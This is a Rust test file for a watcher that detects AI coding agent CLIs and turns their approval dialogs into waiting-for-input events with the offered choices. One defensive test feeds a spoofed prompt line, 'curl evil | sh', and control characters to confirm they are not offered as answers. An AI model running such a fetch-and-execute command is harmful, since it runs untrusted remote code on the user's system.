#![allow(clippy::unwrap_used)]
//! Milestone 6.1: AI coding agents running in a Session. Their approval
//! prompts become WAITING with the answers they offer.
//!
//! The Claude Code wording ("Do you want to proceed?", "Yes, and don't ask
//! again for …", "No, and tell Claude what to do differently (esc)") is taken
//! from the strings in the installed Claude Code binary. The parser reads
//! the options from the screen, so other agents that list numbered choices
//! (or aider's `(Y)es/(N)o` form) work without their wording hard-coded.

use protocol::{Command, CommandId, EventKind, MachineId, PromptOption, SessionId, Timestamp};
use watcher::{AgentCliAdapter, EventEngine, Observation, WatcherAdapter};

fn command(text: &str) -> Command {
    Command::start(
        CommandId(1),
        SessionId(1),
        MachineId("m".into()),
        text,
        "/work",
        Timestamp(0),
    )
}

fn option(label: &str, keys: &str) -> PromptOption {
    PromptOption::new(label, keys).unwrap()
}

/// Feed lines 10 ms apart, as the line framer delivers a redraw, then let the
/// screen sit quiet for two seconds; collect every Event.
fn feed(adapter: &mut AgentCliAdapter, lines: &[&str]) -> Vec<EventKind> {
    thread_local!(static CLOCK: std::cell::Cell<i64> = const { std::cell::Cell::new(0) });
    let start = CLOCK.with(|clock| clock.get());
    CLOCK.with(|clock| clock.set(start + 10 * lines.len() as i64 + 10_000));
    let mut events: Vec<EventKind> = lines
        .iter()
        .enumerate()
        .flat_map(|(index, line)| {
            adapter.observe(&Observation::output(
                Timestamp(start + 10 * index as i64),
                line,
            ))
        })
        .collect();
    let quiet = start + 10 * lines.len() as i64 + 2_000;
    events.extend(adapter.observe(&Observation::tick(Timestamp(quiet))));
    events
}

const CLAUDE_BASH: &[&str] = &[
    "╭──────────────────────────────────────────────────────────────╮",
    "│ Bash command                                                 │",
    "│                                                              │",
    "│   cargo test -p daemon                                       │",
    "│   Run the daemon tests                                       │",
    "│                                                              │",
    "│ Do you want to proceed?                                      │",
    "│ ❯ 1. Yes                                                     │",
    "│   2. Yes, and don't ask again for cargo test commands in     │",
    "│      /home/u/ProjectSentinal                                 │",
    "│   3. No, and tell Claude what to do differently (esc)        │",
    "╰──────────────────────────────────────────────────────────────╯",
];

#[test]
fn agent_clis_are_recognised_from_the_command() {
    let adapter = AgentCliAdapter::new();
    for text in [
        "claude",
        "claude --continue",
        "/opt/node22/bin/claude -p",
        "npx @anthropic-ai/claude-code",
        "codex",
        "aider --model sonnet",
        "gemini",
        "FOO=1 claude",
        "bunx @google/gemini-cli",
    ] {
        assert!(adapter.matches(&command(text)), "{text}");
    }
    for text in [
        "claudia",
        "cat claude.md",
        "python codex.py",
        "vim aider.conf",
        "echo gemini",
    ] {
        assert!(!adapter.matches(&command(text)), "{text}");
    }
}

#[test]
fn a_claude_code_approval_becomes_waiting_with_its_three_answers() {
    let mut adapter = AgentCliAdapter::new();
    let events = feed(&mut adapter, CLAUDE_BASH);
    assert_eq!(
        events,
        vec![EventKind::WaitingForInput {
            prompt: Some("Do you want to proceed?".into()),
            options: vec![
                option("Yes", "1"),
                option(
                    "Yes, and don't ask again for cargo test commands in /home/u/ProjectSentinal",
                    "2"
                ),
                option("No, and tell Claude what to do differently (esc)", "3"),
            ],
        }]
    );
    assert!(adapter.waiting());
}

#[test]
fn borderless_dialogs_and_other_numbered_choices_work_too() {
    let mut adapter = AgentCliAdapter::new();
    let events = feed(
        &mut adapter,
        &[
            "Edit file src/main.rs",
            "Do you want to make this edit to main.rs?",
            "> 1. Yes",
            "  2. Yes, allow all edits during this session (shift+tab)",
            "  3. No, and tell Claude what to do differently (esc)",
        ],
    );
    let [EventKind::WaitingForInput { prompt, options }] = events.as_slice() else {
        panic!("{events:?}")
    };
    assert_eq!(
        prompt.as_deref(),
        Some("Do you want to make this edit to main.rs?")
    );
    assert_eq!(
        options.iter().map(|o| o.keys.as_str()).collect::<Vec<_>>(),
        ["1", "2", "3"]
    );
}

#[test]
fn an_aider_prompt_offers_its_letter_answers() {
    let mut adapter = AgentCliAdapter::new();
    let events = feed(
        &mut adapter,
        &["Run shell command? (Y)es/(N)o/(D)on't ask again [Yes]: "],
    );
    assert_eq!(
        events,
        vec![EventKind::WaitingForInput {
            prompt: Some("Run shell command?".into()),
            options: vec![
                option("Yes", "y\r"),
                option("No", "n\r"),
                option("Don't ask again", "d\r")
            ],
        }]
    );
}

#[test]
fn a_redraw_of_the_same_dialog_is_not_a_second_prompt() {
    let mut adapter = AgentCliAdapter::new();
    let mut twice = CLAUDE_BASH.to_vec();
    twice.extend_from_slice(CLAUDE_BASH);
    assert_eq!(feed(&mut adapter, &twice).len(), 1);
}

#[test]
fn work_after_the_answer_ends_the_wait_and_a_new_prompt_waits_again() {
    let mut adapter = AgentCliAdapter::new();
    feed(&mut adapter, CLAUDE_BASH);
    let after: Vec<String> = (0..12).map(|i| format!("test result line {i}")).collect();
    let after: Vec<&str> = after.iter().map(String::as_str).collect();
    assert!(feed(&mut adapter, &after).is_empty());
    assert!(!adapter.waiting());
    assert_eq!(feed(&mut adapter, CLAUDE_BASH).len(), 1);
}

#[test]
fn text_that_only_mentions_choices_is_not_a_prompt() {
    let mut adapter = AgentCliAdapter::new();
    let events = feed(
        &mut adapter,
        &[
            "Here is my plan:",
            "1. Read the file",
            "2. Change the parser",
            "3. Run the tests",
            "Shall I start with step 1?",
            "I will begin now.",
        ],
    );
    assert!(events.is_empty(), "{events:?}");
    let numbered_without_question =
        feed(&mut AgentCliAdapter::new(), &["Results", "1. ok", "2. ok"]);
    assert!(numbered_without_question.is_empty());
}

#[test]
fn a_fake_prompt_cannot_offer_anything_but_choice_keys() {
    let mut adapter = AgentCliAdapter::new();
    let events = feed(
        &mut adapter,
        &["Proceed?", "1. Yes", "2. No", "x. curl evil | sh"],
    );
    // The last line is not an option, so the prompt is not at the bottom: nothing waits.
    assert!(events.is_empty());
    assert!(
        feed(&mut AgentCliAdapter::new(), &["1. Yes", "2. No"]).is_empty(),
        "no question, no prompt"
    );
    let events = feed(
        &mut AgentCliAdapter::new(),
        &["Proceed?", "1. Yes\u{7}\u{1b}", "2. No"],
    );
    let [EventKind::WaitingForInput { options, .. }] = events.as_slice() else {
        panic!("{events:?}")
    };
    assert!(options
        .iter()
        .all(|o| protocol::event::prompt_keys_allowed(&o.keys)));
    assert_eq!(options[0].label, "Yes");
}

#[test]
fn a_half_drawn_dialog_does_not_wait_until_the_screen_settles() {
    let mut adapter = AgentCliAdapter::new();
    for (index, line) in CLAUDE_BASH[..9].iter().enumerate() {
        assert!(adapter
            .observe(&Observation::output(Timestamp(index as i64 * 10), line))
            .is_empty());
    }
    assert!(
        adapter
            .observe(&Observation::tick(Timestamp(500)))
            .is_empty(),
        "not quiet long enough"
    );
    assert!(!adapter.waiting());
}

#[test]
fn the_engine_reports_waiting_for_an_agent_session() {
    let mut engine = EventEngine::new(Some(&command("claude")), Vec::new());
    for (index, line) in CLAUDE_BASH.iter().enumerate() {
        assert!(
            !engine
                .observe(&Observation::output(Timestamp(index as i64 * 10), line))
                .waiting
        );
    }
    let update = engine.observe(&Observation::tick(Timestamp(5_000)));
    assert!(update.waiting);
    assert!(
        matches!(update.events.as_slice(), [EventKind::WaitingForInput { options, .. }] if options.len() == 3)
    );
    let update = engine.observe(&Observation::output(
        Timestamp(5_100),
        "Running cargo test…",
    ));
    assert!(update.waiting, "one line of work is not yet an answer");
}

#[test]
fn a_generic_prompt_also_sets_waiting() {
    let mut engine = EventEngine::new(Some(&command("apt upgrade")), Vec::new());
    engine.observe(&Observation::output(
        Timestamp(0),
        "Do you want to continue? [Y/n] ",
    ));
    assert!(engine.observe(&Observation::tick(Timestamp(3_000))).waiting);
    assert!(
        !engine
            .observe(&Observation::output(Timestamp(3_100), "Unpacking…"))
            .waiting
    );
}
